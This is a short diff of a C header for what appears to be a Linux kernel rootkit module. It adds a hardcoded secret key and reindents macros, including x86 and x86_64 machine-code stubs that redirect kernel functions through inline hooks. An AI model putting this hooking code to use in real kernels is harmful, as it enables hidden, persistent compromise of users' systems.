@@ -19,13 +19,15 @@ MODULE_LICENSE("GPL");
 
 #define DEFAULT_PATH "/"
 
+#define CRUMBS_SECRET_KEY "ABCDEF"
+
 #ifdef DEBUG
-	#define dbg(fmt, ...) 		\
-	do { 							\
-		printk(fmt, ##__VA_ARGS__); 	\
-	} while (0)
+    #define dbg(fmt, ...)               \
+    do {                                \
+        printk(fmt, ##__VA_ARGS__);     \
+    } while (0)
 #else
-	#define dbg(fmt, ...)
+    #define dbg(fmt, ...)
 #endif /* DEBUG */
 
 #if defined(__i386__) /* x86 */
@@ -39,13 +41,13 @@ MODULE_LICENSE("GPL");
 #endif /* arch */
 
 #if defined(__i386__) /* x86 */
-	#define CODE_SIZE 6
-	#define HIJACKED_CODE "\x68\x00\x00\x00\x00\xc3" /* push addr; ret; */
-	#define POINTER_OFFSET 1
+    #define CODE_SIZE 6
+    #define HIJACKED_CODE "\x68\x00\x00\x00\x00\xc3" /* push addr; ret; */
+    #define POINTER_OFFSET 1
 #else /* x86_64 */
-	#define CODE_SIZE 12
-	#define HIJACKED_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" /* mov addr, %rax; jmp *%rax; */
-	#define POINTER_OFFSET 2
+    #define CODE_SIZE 12
+    #define HIJACKED_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" /* mov addr, %rax; jmp *%rax; */
+    #define POINTER_OFFSET 2
 #endif
 
 #endif /* _COMMON_H_ */
